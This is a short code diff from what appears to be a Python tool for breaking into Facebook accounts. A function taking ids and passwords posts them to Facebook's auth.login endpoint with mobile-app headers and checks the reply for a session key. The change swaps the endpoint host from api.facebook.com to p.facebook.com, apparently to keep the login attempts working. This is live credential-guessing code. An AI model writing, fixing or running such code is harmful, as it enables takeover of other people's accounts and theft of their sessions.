@@ -477,7 +477,7 @@ def _M3_(ids,pasx):
                         'Content-Type': 'application/x-www-form-urlencoded',
                         'X-FB-HTTP-Engine': 'Liger'}
 
-                        url1="https://api.facebook.com/method/auth.login"
+                        url1="https://p.facebook.com/method/auth.login"
                         BLACK=session.post(url1,data=data, headers=head).json()
                         if 'session_key' in BLACK:
                                 uid = BLACK["uid"]
